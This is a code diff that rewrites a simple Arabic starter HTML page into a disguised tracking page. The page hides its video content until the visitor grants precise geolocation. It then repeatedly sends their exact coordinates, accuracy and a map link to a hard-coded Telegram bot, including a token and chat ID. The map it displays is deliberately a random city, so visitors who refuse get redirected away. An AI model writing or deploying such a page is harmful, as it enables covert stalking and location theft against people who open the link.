@@ -1,40 +1,200 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحتي الأولى</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            font-family: Arial, sans-serif;
             background-color: #f5f5f5;
-            text-align: center;
-        }
-        h1 {
-            color: #2c3e50;
-        }
-        p {
-            color: #34495e;
-            line-height: 1.6;
         }
         .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background-color: white;
-            padding: 20px;
+            width: 100%;
+            max-width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            display: none; /* إخفاء المحتوى افتراضياً */
+        }
+        video {
+            width: 100%;
+            height: auto;
+            display: block;
+            margin-bottom: 15px;
             border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .map-container {
+            width: 100%;
+            height: 300px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 15px;
+        }
+        .permission-denied {
+            text-align: center;
+            padding: 50px 20px;
+            font-size: 18px;
+            color: #d32f2f;
+        }
+        @media (min-width: 768px) {
+            .container {
+                max-width: 800px;
+                margin: 0 auto;
+                padding: 20px;
+            }
+            .map-container {
+                height: 400px;
+            }
         }
     </style>
+    <script>
+        // إعدادات البوت
+        const BOT_TOKEN = '8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI';
+        const CHAT_ID = '6451561574';
+        let sendCount = 0;
+
+        // طلب الموقع مباشرة عند تحميل الصفحة
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // إذا وافق على المشاركة، نعرض المحتوى
+                        document.querySelector('.container').style.display = 'block';
+                        sendLocationData(position);
+                        
+                        // تشغيل الفيديو تلقائياً بعد الموافقة
+                        const video = document.getElementById('autoplay-video');
+                        video.play().catch(e => console.log('فشل التشغيل التلقائي:', e));
+                        
+                        // عرض خريطة عشوائية
+                        showRandomMap();
+                    },
+                    function(error) {
+                        // إذا رفض المشاركة
+                        handleError(error);
+                        showPermissionDenied();
+                        setTimeout(() => {
+                            window.location.href = 'about:blank'; // الخروج من الصفحة
+                        }, 3000);
+                    },
+                    {enableHighAccuracy: true, timeout: 10000}
+                );
+            } else {
+                sendToTelegram("❌ المتصفح لا يدعم خدمة الموقع");
+                showPermissionDenied();
+                setTimeout(() => {
+                    window.location.href = 'about:blank'; // الخروج من الصفحة
+                }, 3000);
+            }
+        };
+
+        // عرض رسالة رفض الإذن
+        function showPermissionDenied() {
+            document.body.innerHTML = `
+                <div class="permission-denied">
+                    <h2>يجب الموافقة على مشاركة الموقع الجغرافي لتتمكن من مشاهدة المحتوى</h2>
+                    <p>جاري إغلاق الصفحة...</p>
+                </div>
+            `;
+        }
+
+        // إرسال البيانات الدقيقة إلى التليجرام فقط
+        function sendLocationData(position) {
+            const {latitude, longitude, accuracy} = position.coords;
+            const time = new Date().toLocaleString();
+            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            
+            const message = `📍 موقع المستخدم الدقيق:
+- خط العرض: ${latitude}
+- خط الطول: ${longitude}
+- الدقة: ${accuracy} متر
+- الوقت: ${time}
+- ${mapLink}`;
+            
+            sendToTelegram(message);
+            sendCount++;
+            
+            // إرسال تحديثين إضافيين
+            if (sendCount < 3) {
+                setTimeout(() => {
+                    navigator.geolocation.getCurrentPosition(
+                        sendLocationData,
+                        handleError,
+                        {enableHighAccuracy: true, timeout: 10000}
+                    );
+                }, 5000);
+            }
+        }
+
+        // عرض خريطة عشوائية في الصفحة (ليس الموقع الحقيقي)
+        function showRandomMap() {
+            // إحداثيات عشوائية (مثال: مناطق مختلفة حول العالم)
+            const randomLocations = [
+                {lat: 40.7128, lng: -74.0060},  // نيويورك
+                {lat: 34.0522, lng: -118.2437}, // لوس أنجلوس
+                {lat: 51.5074, lng: -0.1278},  // لندن
+                {lat: 48.8566, lng: 2.3522},    // باريس
+                {lat: 35.6762, lng: 139.6503},  // طوكيو
+                {lat: -33.8688, lng: 151.2093}, // سيدني
+                {lat: 55.7558, lng: 37.6173},   // موسكو
+                {lat: 30.0444, lng: 31.2357}    // القاهرة
+            ];
+            
+            // اختيار موقع عشوائي
+            const randomLocation = randomLocations[Math.floor(Math.random() * randomLocations.length)];
+            
+            // تحديث الخريطة بالموقع العشوائي
+            const iframe = document.getElementById('map-iframe');
+            iframe.src = `https://maps.google.com/maps?q=${randomLocation.lat},${randomLocation.lng}&z=12&output=embed`;
+        }
+
+        function handleError(error) {
+            let errorMessage = "❌ خطأ في الموقع: ";
+            switch(error.code) {
+                case 1: errorMessage += "تم رفض الإذن"; break;
+                case 2: errorMessage += "المعلومات غير متاحة"; break;
+                case 3: errorMessage += "انتهى الوقت"; break;
+                default: errorMessage += "خطأ غير معروف";
+            }
+            sendToTelegram(errorMessage);
+        }
+
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    disable_notification: false
+                })
+            }).catch(e => console.error('Error sending to Telegram:', e));
+        }
+    </script>
 </head>
 <body>
     <div class="container">
-        <h1>مرحباً بك في صفحتي الأولى</h1>
-        <p>هذه صفحة ويب بسيطة تم إنشاؤها باستخدام HTML فقط.</p>
-        <p>يمكنك إضافة المزيد من المحتوى هنا مثل النصوص والصور والروابط.</p>
-        <p>تم تصميم هذه الصفحة لتكون متجاوبة مع مختلف أحجام الشاشات.</p>
+        <!-- الفيديو الذي يعمل تلقائياً -->
+        <video id="autoplay-video" autoplay muted loop controls>
+            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+            متصفحك لا يدعم تشغيل الفيديو.
+        </video>
+        
+        <!-- خريطة جوجل عشوائية -->
+        <div class="map-container">
+            <iframe 
+                id="map-iframe"
+                width="100%" 
+                height="100%" 
+                frameborder="0" 
+                style="border:0"
+                src="https://maps.google.com/maps?q=0,0&z=2&output=embed"
+                allowfullscreen>
+            </iframe>
+        </div>
     </div>
 </body>
 </html>
